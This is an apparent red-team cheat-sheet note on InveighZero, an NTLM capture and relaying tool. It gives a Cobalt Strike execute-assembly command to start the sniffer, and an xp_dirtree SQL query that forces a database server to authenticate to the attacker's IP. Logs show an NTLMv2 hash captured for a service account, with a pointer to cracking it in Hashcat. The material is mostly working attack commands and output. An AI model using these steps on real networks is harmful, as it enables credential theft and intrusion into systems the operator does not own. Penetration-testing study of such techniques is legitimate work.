# InveighZero

## [[NTLM Relaying]]
Capture NetNTLM hash
This should be run as a local admin.

ℹ InveighZero will ignore traffic coming from accounts that are generally deemed to be "uncrackable" such as computer accounts.
```beacon
beacon> execute-assembly C:\Tools\InveighZero\Inveigh\bin\Debug\Inveigh.exe -DNS N -LLMNR N -LLMNRv6 N -HTTP N -FileOutput N

[*] Inveigh 0.913 started at 2022-03-10T18:02:36
[+] Elevated Privilege Mode = Enabled
[+] Primary IP Address = 10.10.17.231
[+] Spoofer IP Address = 10.10.17.231
[+] Packet Sniffer = Enabled
[+] DHCPv6 Spoofer = Disabled
[+] DNS Spoofer = Disabled
[+] LLMNR Spoofer = Disabled
[+] LLMNRv6 Spoofer = Disabled
[+] mDNS Spoofer = Disabled
[+] NBNS Spoofer = Disabled
[+] HTTP Capture = Disabled
[+] Proxy Capture = Disabled
[+] WPAD Authentication = NTLM
[+] WPAD NTLM Authentication Ignore List = Firefox
[+] SMB Capture = Enabled
[+] Machine Account Capture = Disabled
[+] File Output = Disabled
[+] Log Output = Enabled
[+] Pcap Output = Disabled
[+] Previous Session Files = Not Found
[*] Press ESC to access console
```

## [[SQL NetNTLM Capture]]
We can use [[InveighZero]] to listen to the incoming requests (this should be run as a local admin).
1. [[InveighZero#Capture NetNTLM hash]]
2. Run `xp_dirtree` to connect the sql server to your machine running [[InveighZero]]
>EXEC xp_dirtree '\\10.10.17.231\pwn', 1, 1
3. Receive hash on the attacking machine
```beacon
[+] [2022-05-14T15:33:49] TCP(445) SYN packet from 10.10.1.20:50323
[+] [2022-05-14T15:33:49] SMB(445) negotiation request detected from 10.10.1.20:50323
[+] [2022-05-14T15:33:49] SMB(445) NTLM challenge 3006547FFC8E90D8 sent to 10.10.1.20:50323
[+] [2022-05-14T15:33:49] SMB(445) NTLMv2 captured for EDU\svc_mssql from 10.10.1.20(SRV1):50323:
svc_mssql::EDU:[...snip...]
```
4. [[Hashcat#Cracking netntlmv2]]


```meta
requirements: 
results: 
oss: #win 
source: https://github.com/Kevin-Robertson/InveighZero
description: Inveigh is a cross-platform .NET IPv4/IPv6 machine-in-the-middle tool.
```